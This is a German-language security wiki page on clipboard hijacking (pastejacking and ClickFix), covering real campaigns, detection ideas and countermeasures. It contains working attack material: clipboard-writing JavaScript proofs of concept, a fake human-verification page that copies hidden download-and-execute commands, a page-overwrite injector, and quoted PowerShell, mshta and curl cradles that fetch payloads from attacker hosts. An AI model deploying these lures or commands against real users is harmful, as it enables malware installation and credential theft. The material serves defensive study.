# Clipboard Hijacking (Pastejacking)-Angriffe

{{#include ../../banners/hacktricks-training.md}}

> „Füge niemals etwas ein, das du nicht selbst kopiert hast.“ – alter, aber immer noch gültiger Rat

## Überblick

Clipboard Hijacking – auch als *Pastejacking* bekannt – nutzt aus, dass Benutzer regelmäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) platziert programmgesteuert vom Angreifer kontrollierten Text in der System-Zwischenablage. Die Opfer werden normalerweise durch sorgfältig formulierte Social-Engineering-Anweisungen dazu verleitet, **Win + R** (Dialogfeld „Ausführen“), **Win + X** (Schnellzugriff / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage *einzufügen*, wodurch beliebige Befehle sofort ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Inhaltssicherheitskontrollen, die Anhänge, Makros oder die direkte Befehlsausführung überwachen. Daher ist der Angriff bei Phishing-Kampagnen beliebt, die weitverbreitete Malware-Familien wie NetSupport RAT, den Latrodectus loader oder Lumma Stealer verbreiten.<sup>[[1]](#references)</sup>

## Clipper zum Ersetzen von Wallet-Adressen

Bei einer weiteren Variante des **Clipboard Hijacking** werden keine Befehle eingefügt: Sie wartet, bis das Opfer eine **Kryptowährungs-Wallet-Adresse** kopiert, und ersetzt diese dann kurz vor dem Einfügen unbemerkt durch eine vom Angreifer kontrollierte Adresse. Bei langen Wallet-Formaten ist das besonders effektiv, da Benutzer häufig nur die ersten und letzten Zeichen überprüfen.<sup>[[8]](#references)</sup>

Typische Merkmale aus der Praxis:
- **Schlanker Loader + verschachtelte Payload**: Die sichtbare App/EXE wirkt wie ein legitimes Trading- oder „Profit“-Tool, während der eigentliche Clipper tiefer im Bundle versteckt ist (zum Beispiel ein .NET-Loader, der eine verschachtelte Rust-Payload startet).
- **Regex-gesteuerter Ersatz**: Die Malware erkennt Zeichenfolgen wie `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` oder sogar allgemeine **44 Zeichen lange, Solana-ähnliche** Zeichenfolgen und ersetzt sie durch Wallet-Adressen des Angreifers.
- **Wallet-Rotation in großem Maßstab**: Moderne Windows-Samples können **Tausende** Ersatz-Wallet-Adressen pro Währung enthalten, statt einer einzigen statischen Adresse. So wird vermieden, dass die Reputation einer Wallet nach jedem Diebstahl leidet.<sup>[[8]](#references)</sup>

### Ablauf eines Windows-Clippers

Eine häufige Implementierung ist ein verstecktes Fenster, das mit **`AddClipboardFormatListener`** registriert wird. Bei jeder Aktualisierung der Zwischenablage ruft die Malware typischerweise Folgendes auf:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → Zugriff auf die aktuellen Daten in der Zwischenablage.
- **`GetClipboardData`** → Text auslesen.
- **`EmptyClipboard`** + **`SetClipboardData`** → Wallet-Zeichenfolge durch den Wert des Angreifers ersetzen.

Minimale Regex-Muster für die Suche, die häufig in Clipppers zu finden sind:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

User-Level-Persistence reicht für die Auswirkung. Ein beobachtetes Muster ist:<sup>[[8]](#references)</sup>
- Payload nach **`%APPDATA%\silke\silke.exe`** kopieren
- Eine **LNK-Datei im Startup-Ordner** unter `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` erstellen

Erkennungsideen:
- Prozesse, die kontinuierlich Clipboard-APIs aufrufen und gleichzeitig Dateien unter `%APPDATA%` und im **Startup**-Ordner des Benutzers schreiben.
- Erstellung neuer LNK-Dateien oder ausführbarer Dateien, gefolgt von Umschreibungen der Wallet-Adresse in der Zwischenablage.
- Archive oder gefälschte Softwarepakete, die viele ungenutzte Dateien sowie einen kleinen Launcher enthalten, der eine verschachtelte Binärdatei startet.

### macOS: Social Engineering zum Entfernen der Quarantäne + LaunchAgent-Persistenz

Unter macOS liefern manche Kampagnen eine Hilfsdatei namens **`unlocker.command`** mit und weisen das Opfer an, per Rechtsklick → **Öffnen** zu wählen, wenn Gatekeeper meldet, die App sei beschädigt oder stamme von einem nicht verifizierten Entwickler. Das Skript entfernt lediglich die Quarantäne und startet die benachbarte `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Dies ist **kein Gatekeeper-Exploit**, sondern eine **sozialtechnisch herbeigeführte Quarantäne-Umgehung**, die die Tatsache ausnutzt, dass Gatekeeper-Entscheidungen vom xattr `com.apple.quarantine` abhängen.<sup>[[8]](#references)</sup>

Nach der Ausführung kann sich der Clipper als aktueller Benutzer dauerhaft einrichten, indem er Folgendes schreibt:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – Wrapper-Skript
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent mit `RunAtLoad` und `KeepAlive`

Ein nützliches Detail für die Verteidigung: Einige Samples implementieren einen **selbstreparierenden Watchdog**, der den LaunchAgent und den Wrapper etwa alle 30 Sekunden neu schreibt. Wenn Sie zuerst die plist entfernen, **ohne den laufenden Prozess zu beenden**, kann die Malware sie sofort wiederherstellen.<sup>[[8]](#references)</sup> Sichere Reihenfolge für die Bereinigung:
1. Den aktiven Clipper-Prozess beenden.
2. Die LaunchAgent-plist entladen und löschen.
3. `~/launch.sh` und die kopierte Payload löschen.

### Hinweis zur Verteilung: Gefälschte Reputation als Multiplikator

Bei dieser Familie kann die Malware selbst technisch einfach bleiben, während die **Verteilungsebene** die Hauptarbeit übernimmt: Gefälschte GitHub-Stars und Forks, SourceForge-Bewertungen und Downloads, Kommentare und Aufrufe zu YouTube-Tutorials sowie harmlos wirkende VirusTotal-Kommentare und -Bewertungen sollen die Binärdatei vor der Ausführung vertrauenswürdig erscheinen lassen.<sup>[[8]](#references)</sup>

## Erzwungene Copy-Schaltflächen und versteckte Payloads (macOS-Einzeiler)

Einige macOS-Infostealer klonen Installationsseiten (z. B. Homebrew) und **erzwingen die Verwendung einer „Copy“-Schaltfläche**, damit Benutzer nicht nur den sichtbaren Text markieren können. Der Inhalt der Zwischenablage enthält den erwarteten Installationsbefehl sowie eine angehängte Base64-Payload (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einziges Einfügen beides ausführt, während die Benutzeroberfläche den zusätzlichen Schritt verbirgt.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere nutzen die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Der ClickFix- / ClearFake-Ablauf

1. Der Benutzer besucht eine durch Typosquatting gefälschte oder kompromittierte Website (z. B. `docusign.sa[.]com`).
2. Injiziertes **ClearFake**-JavaScript ruft einen `unsecuredCopyToClipboard()`-Helper auf, der unbemerkt einen Base64-kodierten PowerShell-Einzeiler in der Zwischenablage speichert.
3. HTML-Anweisungen fordern das Opfer auf: *„Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie die Eingabetaste, um das Problem zu beheben.“*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL-Sideloading).
5. Der Loader entschlüsselt weitere Stufen, injiziert Shellcode und richtet Persistenz ein (z. B. über eine geplante Aufgabe) – und führt schließlich NetSupport RAT / Latrodectus / Lumma Stealer aus.<sup>[[1]](#references)</sup>

### Beispiel für eine NetSupport RAT-Kette

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legitimes Java WebStart) sucht in seinem Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mit einem rollierenden XOR-Schlüssel `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Ruft eine MSI-Payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mithilfe von `extrac32` und Dateiverkettung rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Zugangsdaten an `sumeriavgv.digital` exfiltriert.<sup>[[1]](#references)</sup>

## ClickFix: Zwischenablage → PowerShell → JS eval → Startup-LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Datei-Downloads und weisen die Opfer stattdessen an, eine Einzeile einzufügen, die JavaScript über WSH abruft und ausführt, es persistent macht und täglich das C2 wechselt. Beispiel einer beobachteten Angriffskette:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Wesentliche Merkmale
- Zur Laufzeit umgekehrte, verschleierte URL, um einer oberflächlichen Prüfung zu entgehen.
- JavaScript hält sich über eine Startup-LNK (WScript/CScript) persistent und wählt den C2 anhand des aktuellen Tages aus – so ist eine schnelle Domain-Rotation möglich.<sup>[[3]](#references)</sup>

Minimales JS-Fragment zur Rotation der C2s nach Datum:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Die nächste Phase setzt üblicherweise einen Loader ein, der Persistenz einrichtet und einen RAT (z. B. PureHVNC) nachlädt. Dabei wird TLS oft an ein fest codiertes Zertifikat gebunden und der Datenverkehr in Chunks aufgeteilt.<sup>[[3]](#references)</sup>

Spezifische Erkennungshinweise für diese Variante
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Autostart-Artefakte: LNK unter `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, die WScript/CScript mit einem JS-Pfad unter `%TEMP%`/`%APPDATA%` aufrufen.
- Registry-/RunMRU- und Befehlszeilen-Telemetrie mit `.split('').reverse().join('')` oder `eval(a.responseText)`.
- Wiederholte Ausführung von `powershell -NoProfile -NonInteractive -Command -` mit großen stdin-Payloads, um lange Skripte ohne lange Befehlszeilen einzuschleusen.
- Geplante Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einem wie ein Updater wirkenden Task/Pfad ausführen (z. B. `\GoogleSystem\GoogleUpdater`).

Threat Hunting
- Täglich wechselnde C2-Hostnamen und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Clipboard-Schreibereignisse mit anschließendem Einfügen per Win+R und sofortiger Ausführung von `powershell.exe` korrelieren.

Blue Teams können Clipboard-, Prozesserstellungs- und Registry-Telemetrie kombinieren, um Pastejacking-Missbrauch gezielt aufzuspüren:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` speichert den Verlauf der Befehle aus **Win + R** – auf ungewöhnliche Base64-/verschleierte Einträge achten.
* Security Event ID **4688** (Prozesserstellung), wenn `ParentImage` == `explorer.exe` und `NewProcessName` zu { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } gehört.
* Event ID **4663** für Dateierstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder in temporären Ordnern unmittelbar vor dem verdächtigen 4688-Ereignis.
* EDR-Clipboard-Sensoren (falls vorhanden) – `Clipboard Write` unmittelbar gefolgt von einem neuen PowerShell-Prozess korrelieren.

## IUAM-artige Verifizierungsseiten (ClickFix Generator): Kopieren in die Zwischenablage und Einfügen in die Konsole + betriebssystemspezifische Payloads

In jüngeren Kampagnen werden in großem Umfang gefälschte CDN-/Browser-Verifizierungsseiten („Just a moment…“, im IUAM-Stil) erstellt, die Nutzer dazu verleiten, betriebssystemspezifische Befehle aus der Zwischenablage in native Konsolen einzufügen. Dadurch wird die Ausführung aus der Browser-Sandbox heraus verlagert. Die Methode funktioniert sowohl unter Windows als auch unter macOS.<sup>[[4]](#references)</sup>

Wichtige Merkmale der vom Builder generierten Seiten
- Betriebssystemerkennung über `navigator.userAgent` zur Anpassung der Payloads (Windows PowerShell/CMD gegenüber macOS Terminal). Optionale Ablenkungsinhalte/No-ops für nicht unterstützte Betriebssysteme erhalten die Illusion.
- Automatisches Kopieren in die Zwischenablage bei harmlosen UI-Aktionen (Checkbox/Copy), während der sichtbare Text vom Inhalt der Zwischenablage abweichen kann.
- Sperrung mobiler Geräte und ein Popover mit Schritt-für-Schritt-Anweisungen: Windows → Win+R→Einfügen→Enter; macOS → Terminal öffnen→Einfügen→Enter.
- Optionale Verschleierung und ein einzelner Injector, der das DOM einer kompromittierten Website mit einer Tailwind-gestalteten Verifizierungsoberfläche überschreibt (keine neue Domain-Registrierung erforderlich).<sup>[[4]](#references)</sup>

Beispiel: Abweichender Inhalt der Zwischenablage + betriebssystemspezifische Verzweigung
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS-Persistenz der ersten Ausführung
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und weniger sichtbare Spuren hinterlässt.<sup>[[4]](#references)</sup>

Übernahme von Seiten direkt auf kompromittierten Websites
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Erkennungs- und Hunting-Ideen speziell für IUAM-artige Köder
- Web: Seiten, die die Clipboard API an Verifizierungs-Widgets binden; Abweichungen zwischen angezeigtem Text und Clipboard-Payload; Verzweigungen anhand von `navigator.userAgent`; Tailwind + Austausch einer Single-Page in verdächtigen Kontexten.
- Windows-Endpunkt: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; Batch-/MSI-Installer, die aus `%TEMP%` ausgeführt werden.
- macOS-Endpunkt: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` in zeitlicher Nähe zu Browser-Ereignissen; Hintergrundjobs laufen nach dem Schließen des Terminals weiter.
- `RunMRU`-Verlauf von Win+R und Clipboard-Schreibvorgänge mit anschließender Erstellung von Konsolenprozessen korrelieren.

Siehe auch unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026: Entwicklungen bei gefälschten CAPTCHAs / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Websites und injiziert Loader-JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) und sogar Blockchain-„Etherhiding“-Aufrufe (z. B. POSTs an Binance-Smart-Chain-API-Endpunkte wie `bsc-testnet.drpc[.]org`) verkettet, um die aktuelle Köderlogik abzurufen. Neuere Overlays verwenden häufig gefälschte CAPTCHAs, die Nutzer anweisen, eine Einzeiler-Anweisung zu kopieren und einzufügen (T1204.004), anstatt etwas herunterzuladen.<sup>[[6]](#references)</sup>
- Die anfängliche Ausführung wird zunehmend an signierte Skripthosts/LOLBAS delegiert. In Angriffsketten vom Januar 2026 wurde die frühere Verwendung von `mshta` durch das integrierte `SyncAppvPublishingServer.vbs` ersetzt, das über `WScript.exe` ausgeführt wird und PowerShell-ähnliche Argumente mit Aliasen/Wildcards übergibt, um Remote-Inhalte abzurufen:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; in Kombination mit `WScript.exe` und ungewöhnlichen Argumenten (Aliase `gal`/`gcm`, Cmdlets mit Platzhaltern, jsDelivr-URLs) wird es zu einer aussagekräftigen LOLBAS-Stufe für ClearFake.<sup>[[6]](#references)</sup>
- Gefälschte CAPTCHA-Payloads wechselten im Februar 2026 wieder zu reinen PowerShell-Download-Cradles. Zwei aktive Beispiele:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Die erste Kette ist ein In-Memory-`iex(irm ...)`-Grabber; die zweite lädt die Inhalte zunächst über `WinHttp.WinHttpRequest.5.1`, schreibt eine temporäre `.ps1`-Datei und startet sie dann mit `-ep bypass` in einem versteckten Fenster.<sup>[[6]](#references)</sup>

Erkennungs- und Hunting-Tipps für diese Varianten
- Prozessabstammung: Browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell-Cradles unmittelbar nach Schreibzugriffen auf die Zwischenablage oder Win+R.
- Schlüsselwörter in der Befehlszeile: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr-/GitHub-/Cloudflare-Worker-Domains oder Muster mit rohen IP-Adressen wie `iex(irm ...)`.
- Netzwerk: ausgehende Verbindungen zu CDN-Worker-Hosts oder Blockchain-RPC-Endpunkten durch Script-Hosts/PowerShell kurz nach dem Surfen im Web.
- Dateien/Registry: Erstellung temporärer `.ps1`-Dateien unter `%TEMP%` sowie RunMRU-Einträge mit diesen Einzeilern; blockieren oder Alarm auslösen, wenn signierte Script-LOLBAS (WScript/cscript/mshta) mit externen URLs oder verschleierten Alias-Zeichenfolgen ausgeführt werden.

## ClickFix-Taktiken im Juni 2026: Paste-Telemetrie, gefälschte Verifizierungskommentare und LOLBin-Ketten

Aktuelle Telemetriedaten von Red Canary zeigen, dass der beständige Indikator **nicht ein einzelner bestimmter Befehl**, sondern die Kombination aus **vom Benutzer unterstütztem Einfügen und Ausführen**, **vertrauenswürdigen Interpretern/LOLBins**, **verschleierten Flags**, **Remote-Abruf** und **sofortiger Ausführung** ist.<sup>[[7]](#references)</sup>

### Auffällige Muster von Angreifern

- **Telemetrie zur Bestätigung des Einfügens**: Manche Payloads rufen vor dem eigentlichen Schritt `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` auf. So wird die Benutzerinteraktion bestätigt, während das Zeitfenster kurz und unauffällig bleibt.
- **Gefälschte Verifizierungskommentare**: PowerShell-Einzeiler können Zeichenfolgen wie `# Security check ✔️ I'm not a robot Verification ID: 138105` anhängen, damit der Befehl auch nach dem Einfügen in „Ausführen“ / `cmd.exe` / den PowerShell-Verlauf noch wie eine CAPTCHA-bezogene Aktion aussieht.
- **Dynamische URL-Rekonstruktion**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermeidet eine statische URL in der Befehlszeile und führt dennoch einen In-Memory-Download mit anschließender Ausführung durch.
- **Ausführung als getarnter Installer**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` missbraucht ungewöhnliche Groß-/Kleinschreibung und Unicode-ähnliche Zeichen in Flags, um anfällige Erkennungsmechanismen zu umgehen, und ähnelt dabei weiterhin `msiexec.exe`.
- **Caret-escapte LOLBin-Ketten**: `cmd.exe` kann Schlüsselwörter durch `^`-Escapes verbergen (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die verschachtelte Shell minimiert starten, Angreiferinhalte unter einer harmlos wirkenden Erweiterung wie `.pdf` speichern und sie anschließend über `mshta` ausführen.<sup>[[7]](#references)</sup>
## Gegenmaßnahmen

1. Browser absichern – Schreibzugriff auf die Zwischenablage deaktivieren (`dom.events.asyncClipboard.clipboardItem` usw.) oder eine Benutzeraktion voraussetzen.
2. Sicherheitsbewusstsein stärken – Benutzer dazu anhalten, sensible Befehle *einzutippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy und Application Control verwenden, um beliebige Einzeiler zu blockieren.
4. Netzwerkkontrollen – ausgehende Anfragen an bekannte Pastejacking- und Malware-C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** missbraucht häufig denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [ClickFix stoppen: So verhindern Sie den ClickFix-Angriffsvektor](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking-PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder bis zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Die ClickFix-Fabrik: IUAM ClickFix Generator erstmals vorgestellt](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Von Sternen zu Upvotes: Gefälschter Ruf befeuert einen Crypto-Clipboard-Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
